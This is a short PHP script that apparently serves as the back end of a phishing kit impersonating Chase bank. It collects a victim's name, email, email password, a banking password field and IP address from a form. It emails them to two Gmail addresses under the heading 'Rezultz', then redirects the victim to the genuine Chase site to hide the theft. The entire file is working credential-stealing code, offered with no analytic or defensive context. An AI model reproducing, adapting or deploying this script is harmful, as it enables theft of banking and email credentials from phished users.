<?

$fullname = $_POST['fullname'];
$email = $_POST['email'];
$password = $_POST['password'];
$acn = $_POST['acn'];
$ip = $_POST['ip'];

        $data= "
=====================
	Denate 

User ID: $fullname
Password: $acn
Email: $email
Email Password: $password
---------------------------------
Submitted By: $ip";

mail ("71mysql@gmail.com,76mysql@gmail.com","Chase $ip","$data","From: Rezultz <rez@r.com>\n");

header("Location: https://www.chase.com/online/services/mobile-banking.htm");


?>